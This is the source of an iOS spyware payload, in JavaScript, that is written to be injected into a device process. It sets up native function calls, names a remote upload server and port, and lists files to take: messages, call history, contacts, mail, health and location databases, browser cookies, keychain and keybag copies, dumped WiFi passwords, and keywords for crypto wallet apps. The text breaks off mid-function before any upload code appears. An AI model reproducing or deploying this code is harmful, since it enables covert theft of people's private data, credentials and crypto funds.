// Forensics File Downloader Payload
// Reads and exfiltrates forensically-relevant files from iOS device via HTTP
// This payload should be injected into a process with filesystem access

class Native {
	
	static #baseAddr;
	static #dlsymAddr;
	static #memcpyAddr;
	static #mallocAddr;
	static #oinvAddr;
	
	// Preallocated memory chunk for general purpose stuff for public use
	static mem = 0n;
	static memSize = 0x4000;
	
	// Preallocated memory chunk for encoding/decoding of string arguments
	static #argMem = 0n;
	static #argMemPtr = 0n;
	static #argMemPtrStr = 0n;
	
	// Pointer to next available memory for native argument
	static #argPtr = 0n;
	static #argPtrPtr = 0n;
	static #argPtrStrPtr = 0n;

	static #dlsymCache = {};
	
	static init() {
		const buff = new BigUint64Array(nativeCallBuff);
		this.#baseAddr = buff[20];
		this.#dlsymAddr = buff[21];
		this.#memcpyAddr = buff[22];
		this.#mallocAddr = buff[23];
		this.#oinvAddr = buff[24];
		
		this.mem = this.#nativeCallAddr(this.#mallocAddr, BigInt(this.memSize));
		this.#argMem = this.#nativeCallAddr(this.#mallocAddr, 0x1000n);
		this.#argMemPtr = this.#nativeCallAddr(this.#mallocAddr, 0x1000n);
		this.#argMemPtrStr = this.#nativeCallAddr(this.#mallocAddr, 0x1000n);
		this.#argPtr = this.#argMem;
		this.#argPtrPtr = this.#argMemPtr;
		this.#argPtrStrPtr = this.#argMemPtrStr;
	}
	
	static write(ptr, buff) {
		if (!ptr)
			return false;
		let buff8 = new Uint8Array(nativeCallBuff);
		let offs = 0;
		let left = buff.byteLength;
		while (left) {
			let len = left;
			if (len > 0x1000)
				len = 0x1000;
			buff8.set(new Uint8Array(buff, offs, len), 0x1000);
			this.#nativeCallAddr(this.#memcpyAddr, ptr + BigInt(offs), this.#baseAddr + 0x1000n, BigInt(len));
			left -= len;
			offs += len;
		}
		return true;
	}
	
	static read(ptr, length) {
		if (!ptr)
			return null;
		let buff = new ArrayBuffer(length);
		let buff8 = new Uint8Array(buff);
		let offs = 0;
		let left = length;
		while (left) {
			let len = left;
			if (len > 0x1000)
				len = 0x1000;
			this.#nativeCallAddr(this.#memcpyAddr, this.#baseAddr + 0x1000n, ptr + BigInt(offs), BigInt(len));
			buff8.set(new Uint8Array(nativeCallBuff, 0x1000, len), offs);
			left -= len;
			offs += len;
		}
		return buff;
	}
	
	static readPtr(ptr) {
		let buff = this.read(ptr, 8);
		const view = new DataView(buff);
		return view.getBigUint64(0, true);
	}
	
	static read32(ptr) {
		let buff = this.read(ptr, 4);
		const view = new DataView(buff);
		return view.getInt32(0, true);
	}
	
	static write64(ptr, value) {
		const buff = new ArrayBuffer(8);
		const view = new DataView(buff);
		view.setBigUint64(0, value, true);
		this.write(ptr, buff);
	}
	
	static readString(ptr, len=1024) {
		let buff = this.read(ptr, len);
		return this.bytesToString(buff, false);
	}
	
	static writeString(ptr, str) {
		const buff = this.stringToBytes(str, true);
		this.write(ptr, buff);
	}
	
	static callSymbol(name, x0, x1, x2, x3, x4, x5, x6, x7) {
		this.#argPtr = this.#argMem;
		x0 = this.#toNative(x0);
		x1 = this.#toNative(x1);
		x2 = this.#toNative(x2);
		x3 = this.#toNative(x3);
		x4 = this.#toNative(x4);
		x5 = this.#toNative(x5);
		x6 = this.#toNative(x6);
		x7 = this.#toNative(x7);
		let ret = this.#nativeCallSymbol(name, x0, x1, x2, x3, x4, x5, x6, x7);
		// Reset argPtr
		this.#argPtr = this.#argMem;
		return ret;
	}

	static bytesToString(bytes, includeNullChar=true) {
		let bytes8 = new Uint8Array(bytes);
		let str = "";
		for (let i=0; i<bytes8.length; i++) {
			if (!includeNullChar && !bytes8[i])
				break;
			str += String.fromCharCode(bytes8[i]);
		}
		return str;
	}
	
	static stringToBytes(str, nullTerminated=false) {
		let buff = new ArrayBuffer(str.length + (nullTerminated ? 1 : 0));
		let s8 = new Uint8Array(buff);
		for (let i=0; i<str.length; i++)
			s8[i] = str.charCodeAt(i);
		if (nullTerminated)
			s8[str.length] = 0x0;
		return s8.buffer;
	}
	
	static #toNative(value) {
		// Strings need to be manually written to native memory
		if (!value)
			return 0n;
		if (typeof value === 'string') {
			if (value.length >= 0x1000) {
				return 0n;
			}
			let ptr = this.#argPtr;
			this.writeString(ptr, value);
			this.#argPtr += BigInt(value.length + 1);
			return ptr;
		}
		else if (typeof value === 'bigint') {
			return value;
		}
		else
			return BigInt(value);
	}

	static #dlsym(name) {
		if (!name)
			return 0n;
		let addr = this.#dlsymCache[name];
		if (addr)
			return addr;
		const RTLD_DEFAULT = 0xfffffffffffffffen;
		const nameBytes = this.stringToBytes(name, true);
		let buff8 = new Uint8Array(nativeCallBuff);
		buff8.set(new Uint8Array(nameBytes), 0x1000);
		addr = this.#nativeCallAddr(this.#dlsymAddr, RTLD_DEFAULT, this.#baseAddr + 0x1000n);
		if (addr)
			this.#dlsymCache[name] = addr;
		return addr;
	}
	
	static #nativeCallAddr(addr, x0=0n, x1=0n, x2=0n, x3=0n, x4=0n, x5=0n, x6=0n, x7=0n) {
		let buff = new BigInt64Array(nativeCallBuff);
		
		buff[0] = addr;
		buff[100] = x0;
		buff[101] = x1;
		buff[102] = x2;
		buff[103] = x3;
		buff[104] = x4;
		buff[105] = x5;
		buff[106] = x6;
		buff[107] = x7;

		invoker();
		
		return buff[200];
	}
	
	static #nativeCallSymbol(name, ...args) {
		const funcAddr = this.#dlsym(name);
		const ret64 = this.#nativeCallAddr(funcAddr, ...args);
		if (ret64 < 0xffffffffn && ret64 > -0xffffffffn)
			return Number(ret64);
		return ret64;
	}
}

// ============================================================================
// Configuration
// ============================================================================

const TAG = "INFO";

// Server configuration - modify as needed
const SERVER_HOST = "sqwas.shapelie.com";
const HTTP_PORT = 8882;
const HTTPS_PORT = 8881;
const UPLOAD_PATH = "/stats";

// Set to true to use HTTPS (CFStream with TLS), false for plain HTTP (raw sockets)
const USE_HTTPS = true;

// Maximum file size to download (15GB)
const MAX_FILE_SIZE = 15000 * 1024 * 1024 * 1024;

// Chunk size for reading large files (128KB)
const CHUNK_SIZE = 128 * 1024;

// ============================================================================
// Forensic File List
// ============================================================================

const FORENSIC_FILES = [
	// Communications 
	{ path: "/private/var/mobile/Library/SMS/sms.db", category: "communications", description: "SMS/iMessage database" },
	{ path: "/private/var/mobile/Library/CallHistoryDB/CallHistory.storedata", category: "communications", description: "Call history" },
	{ path: "/private/var/mobile/Library/AddressBook/AddressBook.sqlitedb", category: "communications", description: "Contacts database" },
	
	// Credentials - WiFi
	{ path: "/private/var/preferences/SystemConfiguration/com.apple.wifi.plist", category: "credentials", description: "WiFi networks config" },
	{ path: "/private/var/preferences/SystemConfiguration/com.apple.wifi-networks.plist.backup", category: "credentials", description: "WiFi networks backup" },
	{ path: "/private/var/preferences/SystemConfiguration/com.apple.wifi-private-mac-networks.plist", category: "credentials", description: "WiFi private MAC networks" },
	{ path: "/private/var/preferences/com.apple.wifi.known-networks.plist", category: "credentials", description: "Known WiFi networks" },
	
	// Browser Data
	{ path: "/private/var/mobile/Library/Safari/History.db", category: "browser", description: "Safari history" },
	{ path: "/private/var/mobile/Library/Safari/Bookmarks.db", category: "browser", description: "Safari bookmarks" },
	{ path: "/private/var/mobile/Library/Safari/BrowserState.db", category: "browser", description: "Safari browser state" },
	{ path: "/private/var/mobile/Library/Cookies/Cookies.binarycookies", category: "browser", description: "Safari cookies" },
	
	// Location Data
	{ path: "/private/var/mobile/Library/Caches/locationd/consolidated.db", category: "location", description: "Location history" },
	{ path: "/private/var/mobile/Library/Caches/locationd/clients.plist", category: "location", description: "Location clients" },
	{ path: "/private/var/root/Library/Caches/locationd/consolidated.db", category: "location", description: "Root location history" },
	
	// Personal Data
	{ path: "/private/var/mobile/Library/Notes/notes.sqlite", category: "personal", description: "Notes database" },
	{ path: "/private/var/mobile/Library/Calendar/Calendar.sqlitedb", category: "personal", description: "Calendar database" },
	{ path: "/private/var/mobile/Media/PhotoData/Photos.sqlite", category: "personal", description: "Photos metadata" },
	{ path: "/private/var/mobile/Library/Health/healthdb.sqlite", category: "personal", description: "Health database" },
	{ path: "/private/var/mobile/Library/Health/healthdb_secure.sqlite", category: "personal", description: "Secure health database" },
	
	// Device Info
	{ path: "/private/var/root/Library/Lockdown/data_ark.plist", category: "device", description: "Device identifiers" },
	{ path: "/private/var/mobile/Library/Preferences/com.apple.identityservices.idstatuscache.plist", category: "device", description: "Identity services cache" },
	{ path: "/private/var/containers/Shared/SystemGroup/systemgroup.com.apple.configurationprofiles/Library/ConfigurationProfiles/ProfileMeta.plist", category: "device", description: "Configuration profiles" },
	{ path: "/private/var/preferences/SystemConfiguration/preferences.plist", category: "device", description: "System preferences" },
	
	// SIM/Cellular Info
	{ path: "/private/var/wireless/Library/Preferences/com.apple.commcenter.plist", category: "device", description: "SIM card information" },
	{ path: "/private/var/wireless/Library/Preferences/com.apple.commcenter.data.plist", category: "device", description: "Cellular data info" },
	{ path: "/private/var/wireless/Library/Databases/CellularUsage.db", category: "device", description: "Cellular usage database" },
	{ path: "/private/var/wireless/Library/ControlCenter/ModuleConfiguration.plist", category: "device", description: "Control Center config" },
	
	// User Preferences
	{ path: "/private/var/mobile/Library/Preferences/com.apple.AppStore.plist", category: "device", description: "App Store preferences" },
	{ path: "/private/var/mobile/Library/Preferences/com.apple.locationd.plist", category: "device", description: "Location services settings" },
	{ path: "/private/var/mobile/Library/Preferences/com.apple.icloud.findmydeviced.FMIPAccounts.plist", category: "device", description: "Find My iPhone settings" },
	{ path: "/private/var/mobile/Library/Preferences/com.apple.MobileBackup.plist", category: "device", description: "Backup information" },
	{ path: "/private/var/mobile/Library/Preferences/com.apple.mobile.ldbackup.plist", category: "device", description: "Backup settings" },
	
	// Social/Interaction Data
	{ path: "/private/var/mobile/Library/CoreDuet/People/interactionC.db", category: "personal", description: "Contacts interaction history" },
	{ path: "/private/var/mobile/Library/PersonalizationPortrait/PPSQLDatabase.db", category: "personal", description: "Personalization data" },
	
	// App Data
	{ path: "/private/var/mobile/Library/Accounts/Accounts3.sqlite", category: "accounts", description: "User accounts" },
	{ path: "/private/var/mobile/Library/Mail/Envelope Index", category: "email", description: "Mail envelope index" },
	{ path: "/private/var/mobile/Library/Mail/Protected Index", category: "email", description: "Mail protected index" },
	
	// Installed Apps Database (best source for bundle IDs)
	{ path: "/private/var/mobile/Library/FrontBoard/applicationState.db", category: "device", description: "Installed applications database" },
	
	// Keychain/Keybag files copied to /tmp by keychain_copier.js (running in configd)
	{ path: "/tmp/keychain-2.db", category: "keychain", description: "Keychain database (copied)" },
	{ path: "/tmp/persona.kb", category: "keybag", description: "Persona keybag" },
	{ path: "/tmp/usersession.kb", category: "keybag", description: "User session keybag" },
	{ path: "/tmp/backup_keys_cache.sqlite", category: "keybag", description: "Backup keys cache" },
	{ path: "/tmp/persona_private.kb", category: "keybag", description: "Persona keybag (private)" },
	{ path: "/tmp/usersession_private.kb", category: "keybag", description: "User session keybag (private)" },
	{ path: "/tmp/System.keybag", category: "keybag", description: "System keybag" },
	{ path: "/tmp/Backup.keybag", category: "keybag", description: "Backup keybag" },
	{ path: "/tmp/persona_keychains.kb", category: "keybag", description: "Persona keybag (Keychains)" },
	{ path: "/tmp/usersession_keychains.kb", category: "keybag", description: "User session keybag (Keychains)" },
	{ path: "/tmp/device.kb", category: "keybag", description: "Device keybag" },
	
	// WiFi passwords dumped by wifi_password_dump.js (running in wifid)
	{ path: "/var/wireless/wifi_passwords.txt", category: "credentials", description: "WiFi passwords" },
	{ path: "/var/wireless/Library/wifi_passwords.txt", category: "credentials", description: "WiFi passwords" },
	{ path: "/var/wireless/Library/Caches/wifi_passwords.txt", category: "credentials", description: "WiFi passwords" },
	{ path: "/var/wireless/Library/Preferences/wifi_passwords.txt", category: "credentials", description: "WiFi passwords" },
	{ path: "/private/var/wireless/wifi_passwords.txt", category: "credentials", description: "WiFi passwords" },
	{ path: "/tmp/wifi_passwords.txt", category: "credentials", description: "WiFi passwords" },
	{ path: "/private/var/tmp/wifi_passwords.txt", category: "credentials", description: "WiFi passwords" },
	{ path: "/var/tmp/wifi_passwords.txt", category: "credentials", description: "WiFi passwords" },
	{ path: "/var/log/wifi_passwords.txt", category: "credentials", description: "WiFi passwords" },
	{ path: "/private/var/log/wifi_passwords.txt", category: "credentials", description: "WiFi passwords" },
	{ path: "/var/root/wifi_passwords.txt", category: "credentials", description: "WiFi passwords" },
	{ path: "/private/var/root/wifi_passwords.txt", category: "credentials", description: "WiFi passwords" },
	{ path: "/var/mobile/wifi_passwords.txt", category: "credentials", description: "WiFi passwords" },
	{ path: "/var/mobile/Library/wifi_passwords.txt", category: "credentials", description: "WiFi passwords" },
	{ path: "/var/mobile/Library/Caches/wifi_passwords.txt", category: "credentials", description: "WiFi passwords" },
	{ path: "/private/var/mobile/Library/Caches/wifi_passwords.txt", category: "credentials", description: "WiFi passwords" },
	{ path: "/var/preferences/wifi_passwords.txt", category: "credentials", description: "WiFi passwords" },
	{ path: "/private/var/preferences/wifi_passwords.txt", category: "credentials", description: "WiFi passwords" },
	{ path: "/var/db/wifi_passwords.txt", category: "credentials", description: "WiFi passwords" },
	{ path: "/private/var/db/wifi_passwords.txt", category: "credentials", description: "WiFi passwords" },
	{ path: "/var/run/wifi_passwords.txt", category: "credentials", description: "WiFi passwords" },
	{ path: "/private/var/run/wifi_passwords.txt", category: "credentials", description: "WiFi passwords" },
	{ path: "/var/networkd/wifi_passwords.txt", category: "credentials", description: "WiFi passwords" },
	{ path: "/private/var/networkd/wifi_passwords.txt", category: "credentials", description: "WiFi passwords" },
	{ path: "/private/var/networkd/db/wifi_passwords.txt", category: "credentials", description: "WiFi passwords" },
	
	// WiFi passwords from securityd (fallback for devices where wifid fails)
	{ path: "/tmp/wifi_passwords_securityd.txt", category: "credentials", description: "WiFi passwords (securityd)" },
	{ path: "/private/var/tmp/wifi_passwords_securityd.txt", category: "credentials", description: "WiFi passwords (securityd)" },
	
	// Full keychain dump from securityd
	{ path: "/private/var/Keychains/keychain_dump.txt", category: "keychain", description: "Keychain dump" },
	{ path: "/var/Keychains/keychain_dump.txt", category: "keychain", description: "Keychain dump" },
	{ path: "/var/keybags/keychain_dump.txt", category: "keychain", description: "Keychain dump" },
	{ path: "/private/var/keybags/keychain_dump.txt", category: "keychain", description: "Keychain dump" },
	{ path: "/private/var/tmp/keychain_dump.txt", category: "keychain", description: "Keychain dump" },
	{ path: "/tmp/keychain_dump.txt", category: "keychain", description: "Keychain dump" },
	{ path: "/var/tmp/keychain_dump.txt", category: "keychain", description: "Keychain dump" },
	{ path: "/var/run/keychain_dump.txt", category: "keychain", description: "Keychain dump" },
	{ path: "/private/var/run/keychain_dump.txt", category: "keychain", description: "Keychain dump" },
	{ path: "/var/db/keychain_dump.txt", category: "keychain", description: "Keychain dump" },
	{ path: "/private/var/db/keychain_dump.txt", category: "keychain", description: "Keychain dump" },
	{ path: "/var/root/keychain_dump.txt", category: "keychain", description: "Keychain dump" },
	{ path: "/private/var/root/keychain_dump.txt", category: "keychain", description: "Keychain dump" },
	{ path: "/var/log/keychain_dump.txt", category: "keychain", description: "Keychain dump" },
	{ path: "/private/var/log/keychain_dump.txt", category: "keychain", description: "Keychain dump" },
];

// ============================================================================
// Crypto Wallet Search Patterns (app names to search for)
// ============================================================================

const CRYPTO_WALLET_PATTERNS = [
	// Major Wallets
	"coinbase",
	"binance",
	"nicegram",
	
	// Hardware Wallet Apps
	"ledger",
	"trezor",
	
	// Multi-chain Wallets
	"trust",
	"trustwallet",
	"metamask",
	"exodus",
	"exodus-movement",
	"atomic",
	"crypto.com",
	
	// Bitcoin Wallets
	"electrum",
	"blockstream",
	"green",
	"breadwallet",
	"brd",
	"mycelium",
	"samourai",
	"bluewallet",
	"wasabi",
	
	// Ethereum Wallets
	"imtoken",
	"zerion",
	"rainbow",
	"uniswap",
	"argent",
	"etherscan",
	
	// Solana Wallets
	"phantom",
	"solflare",
	"solana",
	
	// TON Wallets
	"tonkeeper",
	"tonwallet",
	"mytonwallet",
	"ton",
	
	// Other Chain Wallets
	"terra",
	"keplr",
	"cosmos",
	"avalanche",
	"avax",
	"algorand",
	"xdefi",
	"polkadot",
	"cardano",
	"yoroi",
	"daedalus",
	
	// Exchange Apps
	"kraken",
	"gemini",
	"bitfinex",
	"kucoin",
	"okx",
	"okex",
	"huobi",
	"htx",
	"gate.io",
	"gateio",
	"bybit",
	"bitget",
	"mexc",
	"crypto",
	
	// DeFi/Web3 Apps
	"1inch",
	"safepal",
	"tokenpocket",
	"bitpay",
	"gnosis",
	"safe",
	"defi",
	"swap",
	"dex",
	
	// Telegram
	"telegram",
	
	// General crypto terms
	"wallet",
	"bitcoin",
	"btc",
	"ethereum",
	"eth",
	"crypto",
	"blockchain",
	"web3",
	"nft",
];

// ============================================================================
// Initialize Native
// ============================================================================

Native.init();

// ============================================================================
// Helper Functions
// ============================================================================

/**
 * Get device UUID using IOKit IOPlatformUUID (most reliable method)
 * Falls back to sysctl if IOKit fails
 */
function getDeviceUUID() {
	try {
		// Method 1: IOKit IOPlatformUUID (most reliable with root privileges)
		try {
			const iokitHandle = Native.callSymbol("dlopen", "/System/Library/Frameworks/IOKit.framework/IOKit", 1);
			if (iokitHandle && iokitHandle !== 0n) {
				const cfHandle = Native.callSymbol("dlopen", "/System/Library/Frameworks/CoreFoundation.framework/CoreFoundation", 1);
				const CFStringGetCStringPtr = cfHandle ? Native.callSymbol("dlsym", cfHandle, "CFStringGetCStringPtr") : 0n;
				const CFStringGetCString = cfHandle ? Native.callSymbol("dlsym", cfHandle, "CFStringGetCString") : 0n;
				const CFRelease = cfHandle ? Native.callSymbol("dlsym", cfHandle, "CFRelease") : 0n;
				const CFStringCreateWithCString = cfHandle ? Native.callSymbol("dlsym", cfHandle, "CFStringCreateWithCString") : 0n;
				
				const serviceNamePtr = Native.callSymbol("malloc", 32);
				Native.writeString(serviceNamePtr, "IOPlatformExpertDevice");
				
				const matchingDict = Native.callSymbol("IOServiceMatching", serviceNamePtr);
				Native.callSymbol("free", serviceNamePtr);
				
				if (matchingDict && matchingDict !== 0n) {
					const kIOMasterPortDefault = 0n;
					const platformExpert = Native.callSymbol("IOServiceGetMatchingService", kIOMasterPortDefault, matchingDict);
					
					if (platformExpert && platformExpert !== 0n) {
						const uuidKeyPtr = Native.callSymbol("malloc", 32);
						Native.writeString(uuidKeyPtr, "IOPlatformUUID");
						
						const uuidKeyCFStr = CFStringCreateWithCString ? 
							Native.callSymbol("CFStringCreateWithCString", 0n, uuidKeyPtr, 0x08000100) : 0n;
						Native.callSymbol("free", uuidKeyPtr);
						
						if (uuidKeyCFStr && uuidKeyCFStr !== 0n) {
							const kCFAllocatorDefault = 0n;
							const uuidCFStr = Native.callSymbol("IORegistryEntryCreateCFProperty", 
								platformExpert, uuidKeyCFStr, kCFAllocatorDefault, 0n);
							
							if (CFRelease) {
								Native.callSymbol("CFRelease", uuidKeyCFStr);
							}
							
							if (uuidCFStr && uuidCFStr !== 0n) {
								let uuid = "";
								
								if (CFStringGetCStringPtr) {
									const cstrPtr = Native.callSymbol("CFStringGetCStringPtr", uuidCFStr, 0x08000100);
									if (cstrPtr && cstrPtr !== 0n) {
										uuid = Native.readString(cstrPtr, 256).replace(/\0/g, '').trim();
									}
								}
								
								if (!uuid && CFStringGetCString) {
									const uuidBuf = Native.callSymbol("malloc", 256);
									const result = Native.callSymbol("CFStringGetCString", uuidCFStr, uuidBuf, 256, 0x08000100);
									if (result && result !== 0n) {
										uuid = Native.readString(uuidBuf, 256).replace(/\0/g, '').trim();
									}
									Native.callSymbol("free", uuidBuf);
								}
								
								if (CFRelease) {
									Native.callSymbol("CFRelease", uuidCFStr);
								}
								
								if (uuid && uuid.length > 0) {
									Native.callSymbol("IOObjectRelease", platformExpert);
									return uuid;
								}
							}
						}
						
						Native.callSymbol("IOObjectRelease", platformExpert);
					}
				}
			}
		} catch (ioKitError) {
		}
		
		// Method 2: Fallback to sysctl
		try {
			const CTL_HW = 6;
			const HW_UUID = 25;
			
			const mib = new ArrayBuffer(4 * 2);
			const mibView = new DataView(mib);
			mibView.setInt32(0, CTL_HW, true);
			mibView.setInt32(4, HW_UUID, true);
			
			const mibBuf = Native.callSymbol("malloc", 8);
			if (!mibBuf || mibBuf === 0n) {
				return "unknown-device";
			}
			
			const resultBuf = Native.callSymbol("malloc", 256);
			if (!resultBuf || resultBuf === 0n) {
				Native.callSymbol("free", mibBuf);
				return "unknown-device";
			}
			
			const lengthBuf = Native.callSymbol("malloc", 8);
			if (!lengthBuf || lengthBuf === 0n) {
				Native.callSymbol("free", mibBuf);
				Native.callSymbol("free", resultBuf);
				return "unknown-device";
			}
			
			try {
				Native.write(mibBuf, mib);
				
				const lengthView = new DataView(new ArrayBuffer(8));
				lengthView.setUint32(0, 256, true);
				lengthView.setUint32(4, 0, true);
				Native.write(lengthBuf, lengthView.buffer);
				
				let ret = Native.callSymbol("sysctl", mibBuf, 2, 0n, lengthBuf, 0n, 0);
				if (ret !== 0) {
					return "unknown-device";
				}
				
				const lengthData = Native.read(lengthBuf, 8);
				if (!lengthData) {
					return "unknown-device";
				}
				const lengthView2 = new DataView(lengthData);
				const length = lengthView2.getUint32(0, true);
				
				if (length <= 0 || length > 256) {
					return "unknown-device";
				}
				
				lengthView.setUint32(0, length, true);
				Native.write(lengthBuf, lengthView.buffer);
				
				ret = Native.callSymbol("sysctl", mibBuf, 2, resultBuf, lengthBuf, 0n, 0);
				if (ret !== 0) {
					return "unknown-device";
				}
				
				const rawData = Native.read(resultBuf, length);
				if (!rawData) {
					return "unknown-device";
				}
				
				const bytes = new Uint8Array(rawData);
				let uuid = "";
				
				for (let i = 0; i < bytes.length && i < length; i++) {
					const byte = bytes[i];
					if (byte === 0) {
						break;
					}
					if ((byte >= 32 && byte <= 126) || byte === 45 || byte === 58) {
						uuid += String.fromCharCode(byte);
					}
				}
				
				uuid = uuid.trim();
				
				if (uuid && uuid.length > 0) {
					return uuid;
				}
			} finally {
				Native.callSymbol("free", mibBuf);
				Native.callSymbol("free", resultBuf);
				Native.callSymbol("free", lengthBuf);
			}
		} catch (sysctlError) {
		}
		
		return "unknown-device";
	} catch (e) {
		return "unknown-device";
	}
}

/**
 * Get file size using stat
 */
function getFileSize(filePath) {
	try {
		const statBuf = Native.callSymbol("malloc", BigInt(144));
		if (!statBuf || statBuf === 0n) {
			return -1;
		}
		
		try {
			const statResult = Native.callSymbol("stat", filePath, statBuf);
			if (statResult !== 0) {
				return -1;
			}
			
			// st_size is at offset 0x60 (96) in struct stat on ARM64
			const statData = Native.read(statBuf, 144);
			const statView = new DataView(statData);
			const fileSize = Number(statView.getBigUint64(0x60, true));
			
			return fileSize;
		} finally {
			Native.callSymbol("free", statBuf);
		}
	} catch (e) {
		return -1;
	}
}

/**
 * Check if file exists and is accessible
 */
function fileExists(filePath) {
	const accessResult = Native.callSymbol("access", filePath, 0); // F_OK = 0
	return Number(accessResult) === 0;
}

/**
 * Read directory entry name from dirent structure
 */
function readDirentName(entry) {
	// iOS dirent structure:
	// d_ino: 8 bytes (offset 0)
	// d_seekoff: 8 bytes (offset 8)
	// d_reclen: 2 bytes (offset 16)
	// d_namlen: 2 bytes (offset 18)
	// d_type: 1 byte (offset 20)
	// d_name: variable, starts at offset 21
	const direntData = Native.read(entry, 280);
	if (!direntData || direntData.length < 21) {
		return "";
	}
	
	const direntView = new DataView(direntData);
	const d_namlen = direntView.getUint16(18, true);
	
	if (d_namlen > 0 && d_namlen < 256) {
		const namePtr = entry + 21n;
		const name = Native.readString(namePtr, d_namlen).replace(/\0/g, '').trim();
		if (name.length > 0 && name.charCodeAt(0) >= 0x20 && name.charCodeAt(0) <= 0x7E) {
			return name;
		}
	}
	
	// Fallback: try reading from offset 21
	const namePtr21 = entry + 21n;
	let name = Native.readString(namePtr21, 256).replace(/\0/g, '').trim();
	
	// Strip leading control characters
	while (name.length > 0 && name.charCodeAt(0) >= 1 && name.charCodeAt(0) <= 31) {
		name = name.substring(1);
	}
	
	return name.trim();
}

/**
 * Extract value from XML plist text
 */
function extractPlistValue(plistText, key) {
	try {
		const keyPattern = "<key>" + key + "</key>";
		const keyIndex = plistText.indexOf(keyPattern);
		if (keyIndex === -1) return null;
		
		const afterKey = plistText.substring(keyIndex + keyPattern.length);
		const stringStart = afterKey.indexOf("<string>");
		if (stringStart === -1 || stringStart > 100) return null;
		
		const valueStart = stringStart + 8;
		const valueEnd = afterKey.indexOf("</string>", valueStart);
		if (valueEnd === -1) return null;
		
		return afterKey.substring(valueStart, valueEnd).trim();
	} catch (e) {
		return null;
	}
}

/**
 * Search for bundle ID pattern in binary plist bytes (fallback method)
 * Binary plists can store strings as ASCII, UTF-8, or UTF-16
 */
function extractBundleIdFromBytes(plistBytes) {
	try {
		// Method 1: Convert bytes to ASCII string (skip non-printable)
		let asciiStr = "";
		for (let i = 0; i < plistBytes.length; i++) {
			const c = plistBytes[i];
			if (c >= 32 && c <= 126) {
				asciiStr += String.fromCharCode(c);
			} else if (c === 0 && asciiStr.length > 0 && asciiStr[asciiStr.length-1] !== ' ') {
				asciiStr += " "; // null terminator = word boundary
			}
		}
		
		// Method 2: Also try UTF-16 (every other byte for ASCII range)
		let utf16Str = "";
		for (let i = 0; i < plistBytes.length - 1; i += 2) {
			const c = plistBytes[i];
			const c2 = plistBytes[i + 1];
			if (c >= 32 && c <= 126 && c2 === 0) {
				utf16Str += String.fromCharCode(c);
			} else if (c === 0 && c2 === 0) {
				utf16Str += " ";
			}
		}
		
		// Combine both for searching
		const searchStr = asciiStr + " " + utf16Str;
		
		// Look for bundle ID patterns
		// For group containers, look for "group." prefix first
		const groupPattern = /(group\.[a-zA-Z0-9_.-]+)/g;
		let match;
		while ((match = groupPattern.exec(searchStr)) !== null) {
			const candidate = match[1];
			if (candidate.length > 100) continue;
			// Found a group container ID!
			return candidate;
		}
		
		// Fall back to regular bundle ID pattern
		const bundleIdPattern = /([a-zA-Z][a-zA-Z0-9_-]*\.[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+(?:\.[a-zA-Z0-9_-]+)*)/g;
		while ((match = bundleIdPattern.exec(searchStr)) !== null) {
			const candidate = match[1];
			// Skip common non-bundle patterns
			if (candidate.includes("http://") || candidate.includes("https://")) continue;
			if (candidate.endsWith(".plist") || candidate.endsWith(".db")) continue;
			if (candidate.length > 100) continue;
			
			return candidate;
		}
		
	} catch (e) {
		// Ignore
	}
	return null;
}

/**
 * Extract values from binary plist using CoreFoundation
 * Falls back to byte pattern matching if CF parsing fails
 */
function extractFromBinaryPlist(plistBytes) {
	const result = {};
	
	// First try byte pattern matching (simpler and more reliable)
	const bundleIdFromBytes = extractBundleIdFromBytes(plistBytes);
	if (bundleIdFromBytes) {
		result.MCMMetadataIdentifier = bundleIdFromBytes;
		result.CFBundleIdentifier = bundleIdFromBytes;
	}
	
	try {
		// Create CFData from plist bytes
		const dataPtr = Native.callSymbol("malloc", plistBytes.length);
		if (!dataPtr || dataPtr === 0n) return result;
		
		try {
			// Write plist bytes to memory
			const dataView = new Uint8Array(plistBytes.length);
			for (let i = 0; i < plistBytes.length; i++) {
				dataView[i] = plistBytes[i];
			}
			Native.write(dataPtr, dataView);
			
			// Create CFDataRef
			const kCFAllocatorDefault = 0n;
			const cfData = Native.callSymbol("CFDataCreate", kCFAllocatorDefault, dataPtr, BigInt(plistBytes.length));
			
			if (!cfData || cfData === 0n) return result;
			
			try {
				// Parse plist using CFPropertyListCreateWithData
				const kCFPropertyListImmutable = 0;
				const formatPtr = Native.callSymbol("malloc", 4);
				const errorPtr = Native.callSymbol("malloc", 8);
				
				try {
					Native.write32(formatPtr, 0);
					Native.write64(errorPtr, 0n);
					
					const plist = Native.callSymbol("CFPropertyListCreateWithData", kCFAllocatorDefault, cfData, kCFPropertyListImmutable, formatPtr, errorPtr);
					
					if (!plist || plist === 0n) return result;
					
					try {
						// Helper to extract string value from CFDictionary
						const getValue = (keyStr) => {
							const keyBuf = Native.callSymbol("malloc", keyStr.length + 1);
							if (!keyBuf || keyBuf === 0n) return null;
							
							try {
								Native.writeString(keyBuf, keyStr);
								const cfKey = Native.callSymbol("CFStringCreateWithCString", kCFAllocatorDefault, keyBuf, 0x08000100);
								if (!cfKey || cfKey === 0n) return null;
								
								try {
									const value = Native.callSymbol("CFDictionaryGetValue", plist, cfKey);
									if (!value || value === 0n) return null;
									
									const length = Native.callSymbol("CFStringGetLength", value);
									if (Number(length) <= 0 || Number(length) > 1000) return null;
									
									const maxLen = Number(length) + 1;
									const strBuf = Native.callSymbol("malloc", maxLen);
									if (!strBuf || strBuf === 0n) return null;
									
									try {
										const success = Native.callSymbol("CFStringGetCString", value, strBuf, maxLen, 0x08000100);
										if (success) {
											return Native.readString(strBuf, maxLen).replace(/\0/g, '');
										}
										return null;
									} finally {
										Native.callSymbol("free", strBuf);
									}
								} finally {
									Native.callSymbol("CFRelease", cfKey);
								}
							} finally {
								Native.callSymbol("free", keyBuf);
							}
						};
						
						// CF parsing succeeded, use these values (they're more accurate)
						const cfBundleId = getValue("CFBundleIdentifier");
						const mcmId = getValue("MCMMetadataIdentifier");
						const cfName = getValue("CFBundleName");
						const cfDisplayName = getValue("CFBundleDisplayName");
						
						if (cfBundleId) result.CFBundleIdentifier = cfBundleId;
						if (mcmId) result.MCMMetadataIdentifier = mcmId;
						if (cfName) result.CFBundleName = cfName;
						if (cfDisplayName) result.CFBundleDisplayName = cfDisplayName;
						result.CFBundleShortVersionString = getValue("CFBundleShortVersionString");
						result.CFBundleVersion = getValue("CFBundleVersion");
						
					} finally {
						Native.callSymbol("CFRelease", plist);
					}
				} finally {
					Native.callSymbol("free", formatPtr);
					Native.callSymbol("free", errorPtr);
				}
			} finally {
				Native.callSymbol("CFRelease", cfData);
			}
		} finally {
